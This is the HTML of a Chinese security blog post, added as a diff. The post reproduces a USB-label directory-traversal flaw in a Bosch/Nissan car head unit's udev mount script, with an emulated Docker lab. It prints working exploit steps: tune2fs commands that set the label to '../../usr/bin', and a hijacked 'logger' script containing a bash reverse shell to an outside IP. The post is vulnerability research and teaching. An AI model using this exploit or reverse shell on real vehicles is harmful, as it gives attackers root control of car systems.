@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="U盘目录穿越获取车机SHELL（含模拟环境）利用 U 盘 Getshell 是不是还停留在 Badusb、病毒U盘上，这次就来看一个不一样的。 前段时间在浏览 Github 中看到了一个日产车机破解 项目，其中有利用 U 盘获取车机 SHELL 的骚操作。感觉挺有意思的，花了点时间找到了车机固件，并复现了漏洞。顺手写了一个 Dockerfile 供大家一起玩耍。 目录穿越目录穿越大多发生在 WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="U盘目录穿越获取车机 SHELL（含模拟环境）">
+<meta property="og:url" content="http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/index.html">
+<meta property="og:site_name" content="Delikely&#39;s Blog">
+<meta property="og:description" content="U盘目录穿越获取车机SHELL（含模拟环境）利用 U 盘 Getshell 是不是还停留在 Badusb、病毒U盘上，这次就来看一个不一样的。 前段时间在浏览 Github 中看到了一个日产车机破解 项目，其中有利用 U 盘获取车机 SHELL 的骚操作。感觉挺有意思的，花了点时间找到了车机固件，并复现了漏洞。顺手写了一个 Dockerfile 供大家一起玩耍。 目录穿越目录穿越大多发生在 WEB">
+<meta property="og:locale">
+<meta property="og:image" content="http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/image-20210506220413173.png">
+<meta property="article:published_time" content="2021-06-04T15:31:35.000Z">
+<meta property="article:modified_time" content="2021-06-26T14:01:21.000Z">
+<meta property="article:author" content="Delikely">
+<meta property="article:tag" content="Automotive">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/image-20210506220413173.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/rice.svg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
+          
+        
+    
+    <!-- title -->
+    <title>U盘目录穿越获取车机 SHELL（含模拟环境）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body class="max-width mx-auto px3">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/05/15/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2%E4%B9%8B%E5%AF%BB%E6%89%BE%E5%B7%A5%E7%A8%8B%E6%A8%A1%E5%BC%8F%E7%83%AD%E9%94%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
+      <span id="i-top" class="info" style="display:none;">Arriba</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&text=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&is_video=false&description=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=U盘目录穿越获取车机 SHELL（含模拟环境）&body=Check out this article: http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&title=U盘目录穿越获取车机 SHELL（含模拟环境）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2021/06/04/U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL/&name=U盘目录穿越获取车机 SHELL（含模拟环境）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#U%E7%9B%98%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%8E%B7%E5%8F%96%E8%BD%A6%E6%9C%BASHELL%EF%BC%88%E5%90%AB%E6%A8%A1%E6%8B%9F%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">U盘目录穿越获取车机SHELL（含模拟环境）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.1.</span> <span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        U盘目录穿越获取车机 SHELL（含模拟环境）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Delikely's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-06-04T15:31:35.000Z" itemprop="datePublished">2021-06-04</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Automotive/" rel="tag">Automotive</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="U盘目录穿越获取车机SHELL（含模拟环境）"><a href="#U盘目录穿越获取车机SHELL（含模拟环境）" class="headerlink" title="U盘目录穿越获取车机SHELL（含模拟环境）"></a>U盘目录穿越获取车机SHELL（含模拟环境）</h2><p>利用 U 盘 Getshell 是不是还停留在 Badusb、病毒U盘上，这次就来看一个不一样的。</p>
+<p>前段时间在浏览 Github 中看到了一个<a target="_blank" rel="noopener" href="https://github.com/ea/bosch_headunit_root">日产车机破解</a> 项目，其中有利用 U 盘获取车机 SHELL 的骚操作。感觉挺有意思的，花了点时间找到了车机固件，并复现了漏洞。顺手写了一个 Dockerfile 供大家一起玩耍。</p>
+<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>目录穿越大多发生在 WEB  中，没想到竟然还能出现在硬件设备中。</p>
+<p>车机的操作系统为 Linux，U 盘等外设热插拔由 udev 实现。udev 是 Linux 内核的设备管理器，配置文件在 /etc/udev 下 。udev 会根据设备的 UUID 和 LABEL，构造挂载点。UUID 是块设备的唯一标识符，LAEBL 是块设备的一个标签。</p>
+<p>车机中自定义了 U 盘挂载脚本，在 udev 配置文件 <code>/etc/udev/rules.d/local.rules</code> 中指定 block 设备由脚本 <code>/etc/udev/scripts/mount.sh</code>处理。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SUBSYSTEM==<span class="string">&quot;block&quot;</span>, ACTION==<span class="string">&quot;add&quot;</span>,    KERNEL==<span class="string">&quot;sd*&quot;</span>, ENV&#123;ID_FS_TYPE&#125;==<span class="string">&quot;?*&quot;</span>, \</span><br><span class="line">truetrue    ENV&#123;DKD_PARTITION_TABLE&#125;!=<span class="string">&quot;1&quot;</span>, \</span><br><span class="line">truetrue    ENV&#123;DKD_PRESENTATION_HIDE&#125;!=<span class="string">&quot;1&quot;</span>, \</span><br><span class="line">truetrue    RUN+=<span class="string">&quot;/etc/udev/scripts/mount.sh&quot;</span>, RUN+=<span class="string">&quot;/etc/udev/scripts/trace_proxy.sh&quot;</span></span><br><span class="line">SUBSYSTEM==<span class="string">&quot;block&quot;</span>, ACTION==<span class="string">&quot;remove&quot;</span>, KERNEL==<span class="string">&quot;sd*&quot;</span>, ENV&#123;ID_FS_TYPE&#125;==<span class="string">&quot;?*&quot;</span>, RUN+=<span class="string">&quot;/etc/udev/scripts/mount.sh&quot;</span>, RUN+=<span class="string">&quot;/etc/udev/scripts/trace_proxy.sh&quot;</span></span><br><span class="line">SUBSYSTEM==<span class="string">&quot;block&quot;</span>, ACTION==<span class="string">&quot;change&quot;</span>, KERNEL==<span class="string">&quot;sd*&quot;</span>, ENV&#123;DEVTYPE&#125;==<span class="string">&quot;disk&quot;</span>,  RUN+=<span class="string">&quot;/etc/udev/scripts/mount.sh&quot;</span></span><br></pre></td></tr></table></figure>
+<p>问题就出现mount.sh 脚本中，使用 <code>../../</code>可实现路径穿越，获取系统权限。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">MOUNT=<span class="string">&quot;/bin/mount&quot;</span></span><br><span class="line">UMOUNT=<span class="string">&quot;/bin/umount&quot;</span></span><br><span class="line">MOUNTPT=<span class="string">&quot;/dev/media&quot;</span></span><br><span class="line">MOUNTDB=<span class="string">&quot;/tmp/.automount&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">automount</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;ID_FS_TYPE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">truelogger -p user.err <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;<span class="variable">$DEVNAME</span> has no filesystem, not mounting&quot;</span></span><br><span class="line">true<span class="built_in">return</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Determine the name for the mount point.  First check for the</span></span><br><span class="line">    <span class="comment"># uuid, then for the label and then for a unique name.</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;ID_FS_UUID&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">truemountdir=<span class="variable">$&#123;ID_FS_UUID&#125;</span></span><br><span class="line">    <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="variable">$&#123;ID_FS_LABEL&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">truemountdir=<span class="variable">$&#123;ID_FS_LABEL&#125;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">truemountdir=<span class="string">&quot;disk&quot;</span></span><br><span class="line">true<span class="keyword">while</span> [ -d <span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span> ]; <span class="keyword">do</span></span><br><span class="line">true    mountdir=<span class="string">&quot;<span class="variable">$&#123;mountdir&#125;</span>_&quot;</span></span><br><span class="line">true<span class="keyword">done</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the mount point.</span></span><br><span class="line">    ! <span class="built_in">test</span> -d <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span> &amp;&amp; mkdir -p <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># And mount the disk or partition.</span></span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="variable">$&#123;ID_FS_TYPE&#125;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [ <span class="string">&quot;vfat&quot;</span> = <span class="variable">$&#123;ID_FS_TYPE&#125;</span> ]</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        IOCHARSET=<span class="string">&quot;,utf8=1&quot;</span></span><br><span class="line">      <span class="keyword">elif</span> [ <span class="string">&quot;ntfs&quot;</span> = <span class="variable">$&#123;ID_FS_TYPE&#125;</span> ]</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">        IOCHARSET=<span class="string">&quot;,nls=utf8&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    result=$(<span class="variable">$MOUNT</span> -t <span class="variable">$&#123;ID_FS_TYPE&#125;</span> -o sync,ro<span class="variable">$IOCHARSET</span> <span class="variable">$DEVNAME</span> <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span> 2&gt;&amp;1)</span><br></pre></td></tr></table></figure>
+<p>现在来详细看一下自动挂载函数 automount，首先判断U盘的文件系统 ID_FS_TYPE，可识别就继续执行，否则就退出。接下来的一段是用来拼接构造挂载点的，首先判断设备的 UUID，然后判断设备的 LABEL，哪一个不为空就用哪一个作为设备挂载的文件名，再拼接上 /dev/media 就是形成了最终的挂载点。最后使用 mount 命令将 U盘挂载到刚才构造的这个路径上。</p>
+<p>问题就出在挂载路径上，由于设备的 UUID 和 LABEL 都是能手动修改的。如果在 $mountdir  中引入相对路径，那就能实现路径穿越。然后通过路径穿越劫持系统中的程序，从而实现任意命令执行。UUID 中不能使用点号，所以就只能在 LABEL 上作文章了。接着往下看脚本。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">status=$?</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;status&#125;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">logger -p user.err <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;<span class="variable">$MOUNT</span> -t <span class="variable">$&#123;ID_FS_TYPE&#125;</span> -o sync,ro <span class="variable">$DEVNAME</span> \&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>\&quot; failed: <span class="variable">$&#123;result&#125;</span>&quot;</span></span><br><span class="line">rm_dir <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">logger <span class="string">&quot;mount.sh/automount&quot;</span> <span class="string">&quot;mount [<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>] with type <span class="variable">$&#123;ID_FS_TYPE&#125;</span> successful&quot;</span></span><br><span class="line">mkdir -p <span class="variable">$&#123;MOUNTDB&#125;</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$MOUNTPT</span>/<span class="variable">$mountdir</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;MOUNTDB&#125;</span>/<span class="variable">$devname</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<p>U 盘挂载好之后，还会调用 logger 命令。那就骚操作就来了，将 UUID 设置为空，LABEL 设置为 <code>../usr/bin</code>就能劫持原来的 <code>/usr/bin/</code>下的应用程序。logger  是一个不错的选择，在其中写入命令。U 盘自动挂载时，就会自动执行。下面来看看具体怎么利用。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先准备一个 EXT4 格式的 U 盘。</p>
+<p> blkid 命令用于查看设备的UUID、LABEL等信息。为什么没有看到设备的 LABEL 呢？ 当某个属性为空时就会隐藏。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment">#blkid /dev/sdb1</span></span><br><span class="line">/dev/sdb1: UUID=<span class="string">&quot;cf01cd66-7f32-4713-996a-3af878aba827&quot;</span> BLOCK_SIZE=<span class="string">&quot;4096&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span> </span><br></pre></td></tr></table></figure>
+<p>EXT4 格式的 U 盘默认状态下，只有UUID，LABEL 为空。这两个值都可以使用 tune2fs 修改。</p>
+<ol>
+<li><p>置空 UUID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment"># tune2fs -U NULL /dev/sdb1</span></span><br><span class="line">tune2fs 1.46.2 (28-Feb-2021)</span><br><span class="line">Setting the UUID on this filesystem could take some time.</span><br><span class="line">Proceed anyway (or <span class="built_in">wait</span> 5 seconds to proceed) ? (y,N) y</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置 LABEL </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment"># tune2fs -L &quot;../../usr/bin&quot; /dev/sdb1</span></span><br><span class="line">tune2fs 1.46.2 (28-Feb-2021)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>UUID 和 LABEL 修改完成，使用 blkid 查看修改后的结果，准确无误。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment"># blkid /dev/sdb1</span></span><br><span class="line">/dev/sdc1: LABEL=<span class="string">&quot;../../usr/bin&quot;</span> BLOCK_SIZE=<span class="string">&quot;4096&quot;</span> TYPE=<span class="string">&quot;ext4&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置反弹 shell</p>
+<p>手动挂载 U 盘，在 U 盘中创建一个名为 logger 的 shell 脚本，内容为反弹 shell 。一切设置好之后移除 U 盘。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment"># mount /dev/sdb1 /media/root/</span></span><br><span class="line">root@kali:~/automotive<span class="comment"># mount /dev/sdb1 /media/root/</span></span><br><span class="line">root@kali:~/automotive<span class="comment"># cd /media/root</span></span><br><span class="line">root@kali:/media/root<span class="comment"># cat logger</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.7.132/4444 0&gt;&amp;1</span><br><span class="line">root@kali:/media/root<span class="comment"># chmod +x logger</span></span><br><span class="line">root@kali:/media/root<span class="comment"># cd -</span></span><br><span class="line">root@kali:~/automotive<span class="comment"># umount /dev/sdb1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将特制的 U 盘插入模拟车机</p>
+<p>手里并没有日产的车（PS. 我与 Tesla 漏洞就相距一台 Tesla），而此时手痒怎么办。幸好我找到了固件，搭建了一个模拟环境。</p>
+<p>下载之前制作好的 <a target="_blank" rel="noopener" href="https://github.com/delikely/VulnerableFiles/blob/main/Automotive/bosch headunit root/Dockerfile">Dockerfile</a>，然后使用docker build、docker run 搭建起车机模拟环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/automotive<span class="comment"># wget https://raw.githubusercontent.com/delikely/VulnerableFiles/main/Automotive/bosch%20headunit%20root/Dockerfile</span></span><br><span class="line">root@kali:~/automotive<span class="comment"># docker build -t delikely/bosch_headunit_root:automount .</span></span><br><span class="line">Sending build context to Docker daemon  86.02kB</span><br><span class="line">Step 1/4 : FROM ubuntu:12.04</span><br><span class="line"> ---&gt; 5b117edd0b76</span><br><span class="line">Step 2/4 : WORKDIR /etc/</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 22a68ab4c71d</span><br><span class="line">root@kali:~/automotive<span class="comment"># docker run -itd --privileged=true _headunit_root:automount</span></span><br><span class="line">ee7059240fcea0e24bb01ebdbde51be1198f15b452af42f101307f8684</span><br></pre></td></tr></table></figure>
+<p>使用上述命令创建好 Docker 后，虚拟车机就运行起来了。现在只需要插入之前准备好的 U 盘就能拿到反弹 Shell。</p>
+<p><img src="image-20210506220413173.png" alt="image-20210506220413173"></p>
+<p>注：由于劫持了 /usr/bin/ 目录，很多命令不能用了。若想使用，那就得提前准备，把原来/usr/bin 目录的文件（或相同架构的可执行文件）拷贝到 U 盘根目录。</p>
+</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个漏洞还挺有意思的，利用 U 盘 LABEL 目录遍历劫持 /usr/bin 执行任意命令。之前看过另外一个 <a target="_blank" rel="noopener" href="https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/">Ubuntu 提权漏洞</a>：利用软件链接提权，也让人直呼精彩。这次学到了新姿势，还搭建智能网联车漏洞的第一个模拟环境。后期会持续维护（新增）车联网漏洞模拟环境，欢迎有兴趣的小伙伴一起共建。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ea/bosch_headunit_root">bosch_headunit_root</a></li>
+<li><a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/12858/how-to-change-filesystem-uuid-2-same-uuid">How to change filesystem UUID (2 same UUID)?</a></li>
+<li><a target="_blank" rel="noopener" href="https://securitylab.github.com/research/Ubuntu-gdm3-accountsservice-LPE/">How to get root on Ubuntu 20.04 by pretending nobody’s /home</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
